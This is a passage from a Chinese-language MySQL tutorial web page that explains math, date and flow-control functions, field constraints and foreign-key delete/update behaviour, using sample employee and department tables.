<td>RAND()</td>            <td>返回0~1内的随机数</td>        </tr>          <tr align="center">            <td>ROUND(x,y)</td>            <td>求参数x的四舍五入的值，保留y位小数</td>        </tr>      </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">A. ceil：向上取整</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">ceil</span>(<span class="number">1.1</span>);</span><br><span class="line"></span><br><span class="line">B. floor：向下取整</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">1.9</span>);</span><br><span class="line"></span><br><span class="line">C. mod：取模</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">mod</span>(<span class="number">7</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">D. rand：获取随机数</span><br><span class="line"><span class="keyword">select</span> rand();</span><br><span class="line"></span><br><span class="line">E. round：四舍五入</span><br><span class="line"><span class="keyword">select</span> round(<span class="number">2.344</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">案例：通过数据库的函数，生成一个六位数的随机验证码。</font></div><div style="text-indent:2em;"><font size="4">获取随机数可以通过rand()函数，但是获取出来的随机数是在0-1之间的，所以可以在其基础上乘以1000000，然后舍弃小数部分，如果长度不足6位，补0</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> lpad(round(rand()<span class="operator">*</span><span class="number">1000000</span> , <span class="number">0</span>), <span class="number">6</span>, <span class="string">&#x27;0&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013161341041.png" alt="image-20221013161341041"></p><h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><div style="text-indent:2em;"><font size="4">常见的日期函数如下：</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>函数 </td>            <td>功能</td>        </tr>        <tr align="center">            <td>CURDATE()</td>            <td>返回当前日期</td>        </tr>        <tr align="center">            <td>CURTIME()</td>            <td>返回当前时间</td>        </tr>        <tr align="center">            <td>NOW()</td>            <td>返回当前日期和时间</td>        </tr>           <tr align="center">            <td>YEAR(date)</td>            <td>获取指定date的年份</td>        </tr>          <tr align="center">            <td>MONTH(date)</td>            <td>获取指定date的月份</td>        </tr>          <tr align="center">            <td>DAY(date)</td>            <td>获取指定date的日期</td>        </tr>          <tr align="center">            <td>DATE_ADD(date, INTERVAL exprtype)</td>            <td>返回一个日期/时间值加上一个时间间隔expr后的时间值</td>        </tr>          <tr align="center">            <td>DATEDIFF(date1,date2)</td>            <td>返回起始时间date1 和 结束时间date2之间的天数</td>        </tr>      </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">A. curdate：当前日期</span><br><span class="line"><span class="keyword">select</span> curdate();</span><br><span class="line"></span><br><span class="line">B. curtime：当前时间</span><br><span class="line"><span class="keyword">select</span> curtime();</span><br><span class="line"></span><br><span class="line">C. now：当前日期和时间</span><br><span class="line"><span class="keyword">select</span> now();</span><br><span class="line"></span><br><span class="line">D. <span class="keyword">YEAR</span> , <span class="keyword">MONTH</span> , <span class="keyword">DAY</span>：当前年、月、日</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">YEAR</span>(now());</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">MONTH</span>(now());</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">DAY</span>(now());</span><br><span class="line"></span><br><span class="line">E. date_add：增加指定的时间间隔</span><br><span class="line"><span class="keyword">select</span> date_add(now(),  <span class="type">INTERVAL</span> <span class="number">70</span> <span class="keyword">YEAR</span> );</span><br><span class="line"></span><br><span class="line">F. datediff：获取两个日期相差的天数</span><br><span class="line"><span class="keyword">select</span> datediff(<span class="string">&#x27;2021-10-01&#x27;</span>, <span class="string">&#x27;2021-12-01&#x27;</span>);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">案例：查询所有员工的入职天数，并根据入职天数倒序排序。</font></div><div style="text-indent:2em;"><font size="4">思路： 入职天数，就是通过当前日期 - 入职日期，所以需要使用datediff函数来完成。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name, datediff(curdate(), entrydate) <span class="keyword">as</span> <span class="string">&#x27;entrydays&#x27;</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> entrydays <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013161553816.png" alt="image-20221013161553816"></p><h2 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h2><div style="text-indent:2em;"><font size="4">流程函数也是很常用的一类函数，可以在SQL语句中实现条件筛选，从而提高语句的效率。常见的流程函数如下：</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>函数 </td>            <td>功能</td>        </tr>        <tr align="center">            <td>IF(value , t , f)</td>            <td>如果value为true，则返回t，否则返回f</td>        </tr>        <tr align="center">            <td>IFNULL(value1 , value2)</td>            <td>如果value1不为空，返回value1，否则返回value2</td>        </tr>        <tr align="center">            <td>CASE WHEN [ val1 ] THEN [res1] ...ELSE [ default ] END</td>            <td>如果val1为true，返回res1，... 否则返回default默认值</td>        </tr>           <tr align="center">            <td>CASE [ expr ] WHEN [ val1 ] THEN [res1] ... ELSE [ default ] END</td>            <td>如果expr的值等于val1，返回 res1，... 否则返回default默认值</td>        </tr>      </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">A. if</span><br><span class="line"><span class="keyword">select</span> if(<span class="literal">false</span>, <span class="string">&#x27;Ok&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">B. ifnull</span><br><span class="line"><span class="keyword">select</span> ifnull(<span class="string">&#x27;Ok&#x27;</span>,<span class="string">&#x27;Default&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> ifnull(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;Default&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> ifnull(<span class="keyword">null</span>,<span class="string">&#x27;Default&#x27;</span>);</span><br><span class="line"></span><br><span class="line">C. <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">then</span> <span class="keyword">else</span> <span class="keyword">end</span></span><br><span class="line">需求: 查询emp表的员工姓名和工作地址 (北京<span class="operator">/</span>上海 <span class="comment">----&gt; 一线城市 , 其他 ----&gt; 二线城市)</span></span><br><span class="line"><span class="keyword">select</span> name,( <span class="keyword">case</span> workaddress <span class="keyword">when</span> <span class="string">&#x27;北京&#x27;</span> <span class="keyword">then</span> <span class="string">&#x27;一线城市&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;上海&#x27;</span> <span class="keyword">then</span> <span class="string">&#x27;一线城市&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;二线城市&#x27;</span> <span class="keyword">end</span> ) <span class="keyword">as</span> <span class="string">&#x27;工作地址&#x27;</span> <span class="keyword">from</span> emp;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013162100425.png" alt="image-20221013162100425"></p><div style="text-indent:2em;"><font size="4">案例：首先创建一个简单的数据表。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> score(</span><br><span class="line">id <span class="type">int</span> comment <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">20</span>) comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">math <span class="type">int</span> comment <span class="string">&#x27;数学&#x27;</span>,</span><br><span class="line">english <span class="type">int</span> comment <span class="string">&#x27;英语&#x27;</span>,</span><br><span class="line">chinese <span class="type">int</span> comment <span class="string">&#x27;语文&#x27;</span>) comment <span class="string">&#x27;学员成绩表&#x27;</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> score(id, name, math, english, chinese) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Tom&#x27;</span>, <span class="number">67</span>, <span class="number">88</span>, <span class="number">95</span>), (<span class="number">2</span>, <span class="string">&#x27;Rose&#x27;</span> , <span class="number">23</span>, <span class="number">66</span>, <span class="number">90</span>),(<span class="number">3</span>, <span class="string">&#x27;Jack&#x27;</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">76</span>);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">具体的SQL语句如下:</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,name,</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span> math <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;优秀&#x27;</span> <span class="keyword">when</span> math <span class="operator">&gt;=</span><span class="number">60</span> <span class="keyword">then</span> <span class="string">&#x27;及格&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;不及格&#x27;</span> <span class="keyword">end</span> )<span class="string">&#x27;数学&#x27;</span>,</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span> english <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;优秀&#x27;</span> <span class="keyword">when</span> english <span class="operator">&gt;=</span><span class="number">60</span> <span class="keyword">then</span> <span class="string">&#x27;及格&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;不及格&#x27;</span><span class="keyword">end</span> ) <span class="string">&#x27;英语&#x27;</span>,</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span> chinese <span class="operator">&gt;=</span> <span class="number">85</span> <span class="keyword">then</span> <span class="string">&#x27;优秀&#x27;</span> <span class="keyword">when</span> chinese <span class="operator">&gt;=</span><span class="number">60</span> <span class="keyword">then</span> <span class="string">&#x27;及格&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;不及格&#x27;</span><span class="keyword">end</span> ) <span class="string">&#x27;语文&#x27;</span></span><br><span class="line"><span class="keyword">from</span> score;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013162507265.png" alt="image-20221013162507265"></p><hr><h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><div style="text-indent:2em;"><font size="4">概念：约束是作用于表中字段上的规则，用于限制存储在表中的数据。</font></div><div style="text-indent:2em;"><font size="4">目的：保证数据库中数据的正确、有效性和完整性。</font></div><div style="text-indent:2em;"><font size="4">分类:</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>约束</td>            <td>描述</td>            <td>关键字</td>        </tr>        <tr align="center">            <td>非空约束</td>            <td>限制该字段的数据不能为null</td>            <td>NOT NULL</td>        </tr>        <tr align="center">            <td>唯一约束</td>            <td>保证该字段的所有数据都是唯一、不重复的</td>            <td>UNIQUE</td>        </tr>        <tr align="center">            <td>主键约束</td>            <td>主键是一行数据的唯一标识，要求非空且唯一</td>            <td>PRIMARY KEY</td>        </tr>           <tr align="center">            <td>默认约束</td>            <td>保存数据时，如果未指定该字段的值，则采用默认值</td>            <td>DEFAULT</td>        </tr>          <tr align="center">            <td>检查约束(8.0.16版本之后)</td>            <td>保证字段值满足某一个条件</td>            <td>CHECK</td>        </tr>          <tr align="center">            <td>外键约束</td>            <td>用来让两张表的数据之间建立连接，保证数据的一致性和完整性</td>            <td>FOREIGN KEY</td>        </tr>       </table></div><blockquote><div><font size="4">注意：约束是作用于表中字段上的，可以在创建表/修改表的时候添加约束。</font></div></blockquote><h2 id="约束演示"><a href="#约束演示" class="headerlink" title="约束演示"></a>约束演示</h2><div style="text-indent:2em;"><font size="4">案例需求： 根据需求，完成表结构的创建。需求如下：</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>字段名</td>            <td>字段含义</td>            <td>字段类型</td>            <td>约束条件</td>            <td>约束关键字</td>        </tr>        <tr align="center">            <td>id</td>            <td>ID唯一标识</td>            <td>int</td>            <td>主键，并且自动增长</td>            <td>PRIMARY KEY,AUTO_INCREMENT</td>        </tr>        <tr align="center">            <td>name</td>            <td>姓名</td>            <td>varchar(10)</td>            <td>不为空，并且唯一</td>            <td>NOT NULL , UNIQUE</td>        </tr>        <tr align="center">            <td>age</td>            <td>年龄</td>            <td>age</td>            <td>大于0，并且小于等于120</td>            <td>CHECK</td>        </tr>           <tr align="center">            <td>status</td>            <td>状态</td>            <td>char(1)</td>            <td>如果没有指定该值，默认为1</td>            <td>DEFAULT</td>        </tr>          <tr align="center">            <td>gender</td>            <td>性别</td>            <td>char(1)</td>            <td>无</td>            <td></td>        </tr>      </table></div><div style="text-indent:2em;"><font size="4">对应的建表语句为：</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tb_user(</span><br><span class="line">id <span class="type">int</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY COMMENT <span class="string">&#x27;ID唯一标识&#x27;</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">UNIQUE</span> COMMENT <span class="string">&#x27;姓名&#x27;</span> ,</span><br><span class="line">age <span class="type">int</span> <span class="keyword">check</span> (age <span class="operator">&gt;</span> <span class="number">0</span> <span class="operator">&amp;&amp;</span> age <span class="operator">&lt;=</span> <span class="number">120</span>) COMMENT <span class="string">&#x27;年龄&#x27;</span> ,</span><br><span class="line">status <span class="type">char</span>(<span class="number">1</span>) <span class="keyword">default</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;状态&#x27;</span>,</span><br><span class="line">gender <span class="type">char</span>(<span class="number">1</span>) COMMENT <span class="string">&#x27;性别&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">在为字段添加约束时，只需要在字段之后加上约束的关键字即可，需要关注其语法。执行上面的SQL把表结构创建完成，然后接下来，就可以通过一组数据进行测试，从而验证一下，约束是否可以生效。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom1&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Tom2&#x27;</span>,<span class="number">25</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom3&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="keyword">null</span>,<span class="number">19</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom3&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom4&#x27;</span>,<span class="number">80</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom5&#x27;</span>,<span class="number">-1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,status,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom5&#x27;</span>,<span class="number">121</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_user(name,age,gender) <span class="keyword">values</span> (<span class="string">&#x27;Tom5&#x27;</span>,<span class="number">120</span>,<span class="string">&#x27;男&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2><div style="text-indent:2em;"><font size="4">外键：用来让两张表的数据之间建立连接，从而保证数据的一致性和完整性。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013170001886.png" alt="image-20221013170001886"></p><div style="text-indent:2em;"><font size="4">左侧的emp表是员工表，里面存储员工的基本信息，包含员工的ID、姓名、年龄、职位、薪资、入职日期、上级主管ID、部门ID，在员工的信息中存储的是部门的ID dept_id，而这个部门的ID是关联的部门表dept的主键id，那emp表的dept_id就是外键,关联的是另一张表的主键。</font></div><blockquote><div><font size="4">注意：目前上述两张表，只是在逻辑上存在这样一层关系；在数据库层面，并未建立外键关联，所以是无法保证数据的一致性和完整性的。</font></div></blockquote><div style="text-indent:2em;"><font size="4"><b>准备数据</b></font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;ID&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;部门名称&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;部门表&#x27;</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dept (id, name) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;研发部&#x27;</span>), (<span class="number">2</span>, <span class="string">&#x27;市场部&#x27;</span>),(<span class="number">3</span>, <span class="string">&#x27;财务部&#x27;</span>), (<span class="number">4</span>,<span class="string">&#x27;销售部&#x27;</span>), (<span class="number">5</span>, <span class="string">&#x27;总经办&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(</span><br><span class="line">id <span class="type">int</span> auto_increment comment <span class="string">&#x27;ID&#x27;</span> <span class="keyword">primary</span> key,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">age <span class="type">int</span> comment <span class="string">&#x27;年龄&#x27;</span>,</span><br><span class="line">job <span class="type">varchar</span>(<span class="number">20</span>) comment <span class="string">&#x27;职位&#x27;</span>,</span><br><span class="line">salary <span class="type">int</span> comment <span class="string">&#x27;薪资&#x27;</span>,</span><br><span class="line">entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">managerid <span class="type">int</span> comment <span class="string">&#x27;直属领导ID&#x27;</span>,</span><br><span class="line">dept_id <span class="type">int</span> comment <span class="string">&#x27;部门ID&#x27;</span></span><br><span class="line">)comment <span class="string">&#x27;员工表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> emp (id, name, age, job,salary, entrydate, managerid, dept_id)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;金庸&#x27;</span>, <span class="number">66</span>, <span class="string">&#x27;总裁&#x27;</span>,<span class="number">20000</span>, <span class="string">&#x27;2000-01-01&#x27;</span>, <span class="keyword">null</span>,<span class="number">5</span>),(<span class="number">2</span>, <span class="string">&#x27;张无忌&#x27;</span>, <span class="number">20</span>,<span class="string">&#x27;项目经理&#x27;</span>,<span class="number">12500</span>, <span class="string">&#x27;2005-12-05&#x27;</span>, <span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;杨逍&#x27;</span>, <span class="number">33</span>, <span class="string">&#x27;开发&#x27;</span>, <span class="number">8400</span>,<span class="string">&#x27;2000-11-03&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),(<span class="number">4</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="number">48</span>, <span class="string">&#x27;开发&#x27;</span>,<span class="number">11000</span>, <span class="string">&#x27;2002-02-05&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">(<span class="number">5</span>, <span class="string">&#x27;常遇春&#x27;</span>, <span class="number">43</span>, <span class="string">&#x27;开发&#x27;</span>,<span class="number">10500</span>, <span class="string">&#x27;2004-09-07&#x27;</span>, <span class="number">3</span>,<span class="number">1</span>),(<span class="number">6</span>, <span class="string">&#x27;小昭&#x27;</span>, <span class="number">19</span>, <span class="string">&#x27;程序员鼓励师&#x27;</span>,<span class="number">6600</span>, <span class="string">&#x27;2004-10-12&#x27;</span>, <span class="number">2</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013170833023.png" alt="image-20221013170833023"></p><div style="text-indent:2em;"><font size="4">接下来可以做一个测试，删除id为1的部门信息。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013171442865.png" alt="image-20221013171442865"></p><div style="text-indent:2em;"><font size="4">结果，我们看到删除成功，而删除成功之后，部门表不存在id为1的部门，而在emp表中还有很多的员工，关联的为id为1的部门，此时就出现了数据的不完整性。 而要想解决这个问题就得通过数据库的外键约束。</font></div><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><h4 id="添加外键"><a href="#添加外键" class="headerlink" title="添加外键"></a>添加外键</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">字段名 数据类型,</span><br><span class="line">...</span><br><span class="line">[<span class="keyword">CONSTRAINT</span>] [外键名称] <span class="keyword">FOREIGN</span> KEY (外键字段名) <span class="keyword">REFERENCES</span> 主表 (主表列名)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名称 <span class="keyword">FOREIGN</span> KEY (外键字段名)</span><br><span class="line"><span class="keyword">REFERENCES</span> 主表 (主表列名) ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例:为emp表的dept_id字段添加外键约束,关联dept表的主键id。</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">add</span> <span class="keyword">constraint</span> fk_emp_dept_id <span class="keyword">foreign</span> key (dept_id) <span class="keyword">references</span> dept(id);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">添加了外键约束之后，再到dept表(父表)删除id为1的记录，然后看一下会发生什么现象。此时将会报错，不能删除或更新父表记录，因为存在外键约束。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013172101173.png" alt="image-20221013172101173"></p><h4 id="删除外键"><a href="#删除外键" class="headerlink" title="删除外键"></a>删除外键</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span>  KEY 外键名称;</span><br><span class="line"></span><br><span class="line">案例：删除emp表的外键fk_emp_dept_id。</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_emp_dept_id;</span><br></pre></td></tr></table></figure><h4 id="删除-更新行为"><a href="#删除-更新行为" class="headerlink" title="删除/更新行为"></a>删除/更新行为</h4><div style="text-indent:2em;"><font size="4">添加了外键之后，再删除父表数据时产生的约束行为，我们就称为删除/更新行为。具体的删除/更新行为有以下几种:</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>行为</td>            <td>说明</td>        </tr>        <tr>            <td>NO ACTION</td>            <td>当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除/更新。 (与 RESTRICT 一致) 默认行为</td>        </tr>        <tr>            <td>RESTRICT</td>            <td>当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有则不允许删除/更新。 (与 NO ACTION 一致) 默认行为</td>        </tr>        <tr>            <td>CASCADE</td>            <td>当在父表中删除/更新对应记录时，首先检查该记录是否有对应外键，如果有，则也删除/更新外键在子表中的记录。</td>        </tr>           <tr>            <td>SET  NULL</td>            <td>当在父表中删除对应记录时，首先检查该记录是否有对应外键，如果有则设置子表中该外键值为null（这就要求该外键允许取null）。</td>        </tr>          <tr>            <td>SET DEFAULT</td>            <td>父表有变更时，子表将外键列设置成一个默认的值 (Innodb不支持)</td>        </tr>      </table></div><div style="text-indent:2em;"><font size="4">具体语法为:</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 外键名称 <span class="keyword">FOREIGN</span> KEY (外键字段) <span class="keyword">REFERENCES</span></span><br><span class="line">主表名 (主表字段名) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE;</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">演示如下：</font></div><div style="text-indent:2em;"><font size="4">由于NO ACTION 是默认行为，前面语法演示的时候，已经测试过了，就不再演示了，这里再演示其他的两种行为：CASCADE、SET NULL。</font></div><div style="text-indent:2em;"><font size="5"><b>1). CASCADE</b></font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">add</span> <span class="keyword">constraint</span> fk_emp_dept_id <span class="keyword">foreign</span> key (dept_id) <span class="keyword">references</span></span><br><span class="line">dept(id) <span class="keyword">on</span> <span class="keyword">update</span> cascade <span class="keyword">on</span> <span class="keyword">delete</span> cascade ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span 